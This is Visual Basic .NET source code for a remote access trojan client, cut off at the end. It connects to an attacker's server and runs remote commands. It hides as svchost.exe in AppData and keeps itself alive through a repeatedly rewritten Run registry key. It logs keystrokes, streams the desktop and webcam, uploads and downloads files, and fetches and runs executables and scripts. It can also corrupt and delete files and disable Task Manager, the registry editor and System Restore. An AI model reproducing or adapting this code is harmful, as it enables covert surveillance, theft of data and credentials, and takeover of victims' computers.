Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32

Module Module1
    Dim host As String = "127.0.0.1" 'kingcobraxd.no-ip.biz
    Dim port As Integer = 7218
    Dim client As TcpClient
    Dim bf As New BinaryFormatter
    Dim identification As String = "IDENTIFICATION"
    Dim password As String = "ASD"
    Dim StartupKey As String = ""
    Dim sendingData As Boolean = False
    Dim streamDesktop As Boolean = False
    Dim streamWebcam As Boolean = False
    Dim liveKeystrokeCapture As Boolean = False
    Dim disconnect As Boolean = False
    Dim keylogs As String = "" : Dim WinText As String = "" : Public Const newLine As String = "#-@NewLine@-#"
    Dim hWnd As Integer
    Dim chatThread As Thread
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim chat As System.Windows.Forms.Form
    Dim Textbox1 As Windows.Forms.TextBox
    Dim Textbox2 As Windows.Forms.TextBox
    Dim Button1 As Windows.Forms.Button
    Friend WithEvents K As New Keyboard
    Dim PersistThread As Thread
    Dim listOfDownloads As New List(Of DownloadContainer)
    Const splitter As String = "ESILlzCwXBSrQ1Vb72t6bIXtKRzHJkolNNL94gD8hIi9FwLiiVlrznTz68mkaaJQQSxJfdLyE4jCnl5QJJWuPD4NeO4WFYURvmkth8"
    Const key As String = "pSILlzCwXBSrQ1Vb72t6bIXtKRzAHJklNNL94gD8hIi9FwLiiVlr"
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriverIndex As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    Private Declare Function capCreateCaptureWindowA Lib "avicap32" (ByVal lpszWindowName As String, ByVal dwStyle As Int32, ByVal x As Int32, ByVal y As Int32, ByVal nWidth As Int32, ByVal nHeight As Short, ByVal hWnd As Int32, ByVal nID As Int32) As Int32
    Private Declare Function DestroyWindow Lib "user32" (ByVal hndw As Int32) As Boolean
    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Declare Function GetForegroundWindow Lib "user32.dll" Alias "GetForegroundWindow" () As Int32
    Sub Main()
        Thread.Sleep(500)
        Try
            Dim data As String = IO.File.ReadAllText(Application.ExecutablePath)
            Dim settings() As String = Split(data, splitter)
            Try
                System.Threading.Mutex.OpenExisting(XORDecryption(key, settings(9))) : End
            Catch
                Dim mutex As New Mutex(False, XORDecryption(key, settings(9)))
            End Try
            host = XORDecryption(key, settings(1))
            port = Convert.ToInt32(XORDecryption(key, settings(2)))
            identification = XORDecryption(key, settings(3))
            password = XORDecryption(key, settings(4))
            'MessageBox
            If XORDecryption(key, settings(10)) = "True" And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                Dim msb As MessageBoxButtons = MessageBoxButtons.OK
                Dim msi As MessageBoxIcon = MessageBoxIcon.Information
                Select Case XORDecryption(key, settings(11))
                    Case 1
                        msi = MessageBoxIcon.Question
                    Case 2
                        msi = MessageBoxIcon.Warning
                    Case 3
                        msi = MessageBoxIcon.Error
                End Select
                Select Case XORDecryption(key, settings(12))
                    Case 0
                        msb = MessageBoxButtons.YesNo
                    Case 1
                        msb = MessageBoxButtons.YesNoCancel
                    Case 3
                        msb = MessageBoxButtons.OKCancel
                    Case 4
                        msb = MessageBoxButtons.RetryCancel
                    Case 5
                        msb = MessageBoxButtons.AbortRetryIgnore
                End Select
                MessageBox.Show(XORDecryption(key, settings(14)), XORDecryption(key, settings(13)), msb, msi)
            End If
            'Melt
            If XORDecryption(key, settings(7)) = "True" Then
                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                    If File.Exists(Path.GetTempPath & "melt.txt") Then
                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                    End If
                Else
                    If File.Exists(Path.GetTempPath & "melt.txt") Then
                        Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                    End If
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
            'ActiveX Startup
            If XORDecryption(key, settings(5)) = "True" Then
                If Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    End If
                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                End If
                Try
                    StartupKey = XORDecryption(key, settings(6))
                    Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                    regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
                Catch : End Try
                'Persistence
                If XORDecryption(key, settings(8)) = "True" Then
                    PersistThread = New Thread(AddressOf Persist)
                    PersistThread.IsBackground = True : PersistThread.Start(XORDecryption(key, settings(6)))
                End If
            End If
        Catch
        End Try
        K.CreateHook()
        Dim t As New Thread(AddressOf Connect)
        t.IsBackground = True : t.Start()
        Application.Run()
    End Sub
    Sub Connect()
A:
        Try
            client = New TcpClient(host, port)
            Send("Connect|" & password & "|" & Globalization.RegionInfo.CurrentRegion.DisplayName & "|" & getID() & "|" & GenerateOperatingSystem() & "|1.0")
            client.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
        Catch ex As Exception
            Threading.Thread.Sleep(4000) : GoTo A
        End Try
    End Sub
    Function getID() As String
        Try
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\STR\")
            identification = regKey.GetValue("ID") : regKey.Close()
        Catch : End Try
        Return identification
    End Function
    Sub Persist(ByVal Skey As String)
        Do
            System.Threading.Thread.Sleep(500)
            Try
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(Skey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        Loop
    End Sub
    Sub Read(ByVal ar As IAsyncResult)
        Try
            If client.GetStream.DataAvailable And client.GetStream.CanRead Then
                Dim t As New Thread(AddressOf Parse)
                t.IsBackground = True : t.Start(DirectCast(bf.Deserialize(client.GetStream), Data))
            End If
            client.GetStream.Flush() : client.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
        Catch ex As Exception
            Threading.Thread.Sleep(4000)
            Try : chatThread.Abort() : Catch : End Try
            If disconnect Then Thread.Sleep(56000)
            disconnect = False : Connect()
        End Try
    End Sub
    Sub Parse(ByVal info As Data)
        Dim Message As String = XORDecryption(key, info.GetData)
        Try
            Dim cut() As String = Message.Split("|")
            Select Case cut(0)
                Case "GetInfo"
                    Send("MyInfo|" & My.Computer.Name & "|" & Globalization.RegionInfo.CurrentRegion.DisplayName & "|" & My.Computer.Info.OSFullName & "|" & My.Computer.Info.TotalPhysicalMemory.ToString & "|1.0")
                Case "UpdateFromURL"
                    If File.Exists(Application.StartupPath & "\Windows Update.exe") Then
                        File.Delete(Application.StartupPath & "\Windows Update.exe")
                    End If
                    My.Computer.Network.DownloadFile(cut(1), Application.StartupPath & "\Windows Update.exe")
                    Process.Start(Application.StartupPath & "\Windows Update.exe")
                    End
                Case "UpdateFromFile"
                    If File.Exists(Application.StartupPath & "\Windows Update.exe") Then
                        File.Delete(Application.StartupPath & "\Windows Update.exe")
                    End If
                    IO.File.WriteAllBytes(Application.StartupPath & "\Windows Update.exe", info.GetBytes)
                    Process.Start(Application.StartupPath & "\Windows Update.exe")
                    End
                Case "ChangeID"
                    My.Computer.Registry.CurrentUser.CreateSubKey("Software\STR\")
                    Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\STR\", True)
                    regKey.SetValue("ID", cut(1)) : regKey.Close() : Send("NewID|" & getID())
                Case "RestartServer"
                    Application.Restart()
                Case "Uninstall"
                    Try
                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()
                    Catch ex As Exception
                    End Try
                    End
                Case "Close"
                    End
                Case "Logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "Restart"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "Shutdown"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "StartDesktop"
                    streamDesktop = True
                    Dim t As New Thread(AddressOf RemoteDesktop)
                    t.IsBackground = True : t.Start()
                Case "LClickDown"
                    System.Threading.Thread.Sleep(100)
                    Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim xquotient As Double = Convert.ToDouble(cut(1)) * x
                    Dim yquotient As Double = Convert.ToDouble(cut(2)) * y
                    Cursor.Position = New Point(xquotient, yquotient)
                    System.Threading.Thread.Sleep(100)
                    mouse_event(&H2, 0, 0, 0, 0)
                Case "RClickDown"
                    System.Threading.Thread.Sleep(100)
                    Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim xquotient As Double = Convert.ToDouble(cut(1)) * x
                    Dim yquotient As Double = Convert.ToDouble(cut(2)) * y
                    Cursor.Position = New Point(xquotient, yquotient)
                    System.Threading.Thread.Sleep(100)
                    mouse_event(&H8, 0, 0, 0, 0)
                Case "MoveMouse"
                    Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim xquotient As Double = Convert.ToDouble(cut(1)) * x
                    Dim yquotient As Double = Convert.ToDouble(cut(2)) * y
                    Cursor.Position = New Point(xquotient, yquotient)
                Case "LClickUp"
                    System.Threading.Thread.Sleep(100)
                    Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim xquotient As Double = Convert.ToDouble(cut(1)) * x
                    Dim yquotient As Double = Convert.ToDouble(cut(2)) * y
                    Cursor.Position = New Point(xquotient, yquotient)
                    System.Threading.Thread.Sleep(100)
                    mouse_event(&H4, 0, 0, 0, 0)
                Case "RClickUp"
                    System.Threading.Thread.Sleep(100)
                    Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim xquotient As Double = Convert.ToDouble(cut(1)) * x
                    Dim yquotient As Double = Convert.ToDouble(cut(2)) * y
                    Cursor.Position = New Point(xquotient, yquotient)
                    System.Threading.Thread.Sleep(100)
                    mouse_event(&H10, 0, 0, 0, 0)
                Case "StopDesktop"
                    streamDesktop = False
                Case "GetWebcamList"
                    Dim DriverName As String = Space(80)
                    Dim DriverVersion As String = Space(80)
                    For i As Integer = 0 To 9
                        If capGetDriverDescriptionA(i, DriverName, 80, DriverVersion, 80) Then
                            Send("AddCam|" & DriverName.Trim)
                        End If
                    Next
                Case "StartWebcam"
                    streamWebcam = True
                    Dim t As New Thread(AddressOf RemoteWebcam)
                    t.IsBackground = True : t.Start(cut(1))
                Case "StopWebcam"
                    streamWebcam = False
                Case "GetDrives"
                    Send("FileManager|" & getDrives())
                Case "FileManager"
                    Try
                        Send("FileManager|" & getFolders(cut(1)) & getFiles(cut(1)))
                    Catch
                        Send("FileManager|Error")
                    End Try
                Case "Upload"
                    Try
                        If File.Exists(cut(1)) Then File.Delete(cut(1))
                        Dim fs As New FileStream(cut(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = info.GetBytes
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        Send("NextPartOfUpload|" & cut(2))
                    Catch
                        Send("UploadFailed|" & cut(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(cut(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = info.GetBytes
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        Send("NextPartOfUpload|" & cut(2))
                    Catch
                        GoTo A 'Send("UploadFailed|" & cut(2))
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(cut(1)) Then File.Delete(cut(1))
                    Catch
                        GoTo B
                    End Try
                Case "Download"
                    Try
                        Dim f As New FileInfo(cut(1))
                        Dim remainder As Long = f.Length Mod 100
                        Dim sizeOfParts As Long = ((f.Length - remainder) / 100) - 1
                        Dim packet(sizeOfParts) As Byte
                        Dim fs As New FileStream(cut(1), FileMode.Open, FileAccess.Read)
                        Dim tempBytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                        Dim percentage As Integer = 0 : Dim currentAmount As Integer = 0
                        currentAmount += tempBytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                        Send("RetrievedFile|" & cut(2) & "|" & cut(3) & "|" & percentage, , packet)
                        listOfDownloads.Add(New DownloadContainer(Convert.ToInt64(cut(2))))
                        For Each item As DownloadContainer In listOfDownloads
                            If item.identification = Convert.ToInt64(cut(2)) Then
                                Do
                                    Do Until item.nextPart = True
                                        Application.DoEvents()
                                    Loop
                                    If item.cancel Then Exit Sub
                                    Dim bytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                                    If bytesRead = 0 Then
                                        Send("RetrievedComplete|" & cut(2))
                                        fs.Close() : Exit Sub
                                    End If
                                    item.nextPart = False
                                    currentAmount += bytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                                    Send("RetrievedContinue|" & cut(2) & "|" & cut(3) & "|" & percentage, , packet)
                                Loop
                                Exit For
                            End If
                        Next
                    Catch
                        Send("RetrieveFailed|" & cut(2) & "|" & cut(3))
                    End Try
                Case "NextPartOfDownload"
                    For Each item As DownloadContainer In listOfDownloads
                        If item.identification = Convert.ToInt64(cut(1)) Then
                            item.nextPart = True : Exit For
                        End If
                    Next
                Case "RetrieveCanceled"
                    For Each item As DownloadContainer In listOfDownloads
                        If item.identification = Convert.ToInt64(cut(1)) Then
                            item.cancel = True : Exit For
                        End If
                    Next
                Case "Rename"
                    Select Case cut(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(cut(2), cut(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(cut(2), cut(3))
                    End Select
                Case "Execute"
                    Process.Start(cut(1))
                Case "Corrupt"
                    My.Computer.FileSystem.WriteAllText(cut(1), "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1OBXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8newVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves42mYUI42", False)
                Case "Delete"
                    Select Case cut(1)
                        Case "Folder"
                            IO.Directory.Delete(cut(2))
                        Case "File"
                            IO.File.Delete(cut(2))
                    End Select
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    Send("ProcessManager|" & allProcess)
                Case "ResumeProcess"
                    Dim eachprocess As String() = cut(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each PThread As ProcessThread In Process.GetProcessesByName(eachprocess(i))(0).Threads
                            ResumeProcess(handle(PThread.Id))
                        Next
                    Next
                Case "SuspendProcess"
                    Dim eachprocess As String() = cut(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each PThread As ProcessThread In Process.GetProcessesByName(eachprocess(i))(0).Threads
                            SuspendProcess(handle(PThread.Id))
                        Next
                    Next
                Case "KillProcess"
                    Dim eachprocess As String() = cut(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next
                Case "StartKeystrokeCapture"
                    Send("Keylogs|" & keylogs.Replace(vbNewLine, newLine)) : liveKeystrokeCapture = True
                Case "StopKeystrokeCapture"
                    liveKeystrokeCapture = False
                Case "ClearKeystrokeCapture"
                    keylogs = ""
                Case "StartChatSystem"
                    chatThread = New Thread(AddressOf StartChat)
                    chatThread.IsBackground = True : chatThread.Start()
                Case "Chat"
                    ChatText("[" & TimeOfDay & "] Admin: " & vbNewLine & cut(1) & vbNewLine & vbNewLine)
                Case "StopChatSystem"
                    Try : chatThread.Abort() : Catch : End Try
                Case "GetClipboard"
                    Dim t As New Thread(AddressOf GetClipboard)
                    t.IsBackground = True : t.SetApartmentState(ApartmentState.STA) : t.Start()
                Case "SetClipboard"
                    Dim t As New Thread(AddressOf SetClipboard)
                    t.IsBackground = True : t.SetApartmentState(ApartmentState.STA) : t.Start(cut(1))
                Case "ClearClipboard"
                    Dim t As New Thread(AddressOf ClearClipboard)
                    t.IsBackground = True : t.SetApartmentState(ApartmentState.STA) : t.Start()
                Case "VisitURL"
                    Process.Start(cut(1))
                Case "Download+Execute"
                    My.Computer.Network.DownloadFile(cut(1), Path.GetTempPath & cut(2))
                Case "Message"
                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons
                    Select Case cut(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case cut(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(cut(4), cut(3), messagebutton, messageicon)
                Case "Batch"
                    If File.Exists(Path.GetTempPath & "bat.bat") Then
                        File.Delete(Path.GetTempPath & "bat.bat")
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & "bat.bat", Message.Substring(6).Replace(newLine, vbNewLine))
                    Process.Start(Path.GetTempPath & "bat.bat")
                Case "Html"
                    If File.Exists(Path.GetTempPath & "html.html") Then
                        File.Delete(Path.GetTempPath & "html.html")
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & "html.html", Message.Substring(5).Replace(newLine, vbNewLine))
                    Process.Start(Path.GetTempPath & "html.html")
                Case "Vbs"
                    If File.Exists(Path.GetTempPath & "vbs.vbs") Then
                        File.Delete(Path.GetTempPath & "vbs.vbs")
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & "vbs.vbs", Message.Substring(4).Replace(newLine, vbNewLine))
                    Process.Start(Path.GetTempPath & "vbs.vbs")
                Case "OpenCD"
                    mciSendString("set CDAudio door open", "", 0, 0)
                Case "CloseCD"
                    mciSendString("set CDAudio door closed", "", 0, 0)
                Case "DisableKM"
                    apiBlockInput(1)
                Case "EnableKM"
                    apiBlockInput(0)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)
                Case "HideTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
                Case "ShowTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
                Case "DisableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(cut(1))
                Case "Leave"
                    disconnect = True : client.Close()
                    'client.Close() : Threading.Thread.Sleep(60000) : Connect()
            End Select
        Catch
        End Try
    End Sub
    Sub Send(ByVal message As String, Optional ByVal pic As Image = Nothing, Optional ByVal bytes() As Byte = Nothing)
        Try
            Dim info As New Data(XOREncryption(key, message), pic, bytes)
            Do Until Not sendingData : Application.DoEvents() : Loop
            sendingData = True : bf.Serialize(client.GetStream, info) : sendingData = False
        Catch ex As Exception
            sendingData = False
        End Try
    End Sub
    Public Function GenerateOperatingSystem() As String
        Dim os As System.OperatingSystem = System.Environment.OSVersion
        Dim osName As String = "UN"
        Select Case os.Platform
            Case System.PlatformID.Win32Windows
                Select Case os.Version.Minor
                    Case 0 : osName = "95"
                    Case 10 : osName = "98"
                    Case 90 : osName = "ME"
                End Select
            Case System.PlatformID.Win32NT : Select Case os.Version.Major
                    Case 3 : osName = "NT"
                    Case 4 : osName = "NT"
                    Case 5
                        If os.Version.Minor = 0 Then
                            osName = "2K"
                        ElseIf os.Version.Minor = 1 Then
                            osName = "XP"
                        ElseIf os.Version.Minor = 2 Then
                            osName = "2K3"
                        End If
                    Case 6 : osName = "VS"
                        If os.Version.Minor = 0 Then
                            osName = "VS"
                        ElseIf os.Version.Minor = 1 Then
                            osName = "W7"
                        End If
                End Select
        End Select
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            osName += "x32"
        Else
            osName += "x64"
        End If
        Return osName
    End Function
    Public Function XORDecryption(ByVal CodeKey As String, ByVal DataIn As String) As String
        Dim lonDataPtr As Long
        Dim strDataOut As String = ""
        Dim intXOrValue1 As Integer
        Dim intXOrValue2 As Integer
        For lonDataPtr = 1 To (Len(DataIn) / 2)
            intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
            intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
            strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
        Next lonDataPtr
        XORDecryption = strDataOut
    End Function
    Public Function XOREncryption(ByVal CodeKey As String, ByVal DataIn As String) As String
        Dim lonDataPtr As Long
        Dim strDataOut As String = ""
        Dim temp As Integer
        Dim tempstring As String
        Dim intXOrValue1 As Integer
        Dim intXOrValue2 As Integer
        For lonDataPtr = 1 To Len(DataIn)
            intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
            'The second value comes from the code key
            intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
            temp = (intXOrValue1 Xor intXOrValue2)
            tempstring = Hex(temp)
            If Len(tempstring) = 1 Then tempstring = "0" & tempstring
            strDataOut = strDataOut + tempstring
        Next lonDataPtr
        XOREncryption = strDataOut
    End Function
    Sub RemoteDesktop()
        Try
            While streamDesktop And client.Connected : Thread.Sleep(10) : Send("RemoteDesktop|", CaptureDesktop) : End While
        Catch : End Try
    End Sub
    Public Function CaptureDesktop() As Image
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function
    Sub RemoteWebcam(ByVal index As String)
        Try
            While streamWebcam And client.Connected
                PictureBox1 = New PictureBox
                hWnd = capCreateCaptureWindowA(index, &H10000000 Or &H40000000, 0, 0, 0, 0, PictureBox1.Handle.ToInt32, 0)
                If SendCamMessage(hWnd, &H400S + 10, Convert.ToInt32(index), 0) Then
                    Send("RemoteWebcam", CaptureWebcam)
                    DestroyWindow(hWnd)
                    My.Computer.Clipboard.Clear()
                End If
                Thread.Sleep(100)
            End While
        Catch : End Try
    End Sub
    Public Function CaptureWebcam() As Image
        Try
            SendMessage(hWnd, &H400S + 30, 0, 0)
            Dim aquired As IDataObject = Clipboard.GetDataObject()
            Return CType(aquired.GetData(GetType(Bitmap)), Image)
        Catch
            Return Nothing
        End Try
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    <DllImport("kernel32.dll")> Private Function OpenThread(ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As Integer) As IntPtr
    End Function
    <Flags()> Public Enum ThreadAccess As Integer
        TERMINATE = (&H1)
        SUSPEND_RESUME = (&H2)
        GET_CONTEXT = (&H8)
        SET_CONTEXT = (&H10)
        SET_INFORMATION = (&H20)
        QUERY_INFORMATION = (&H40)
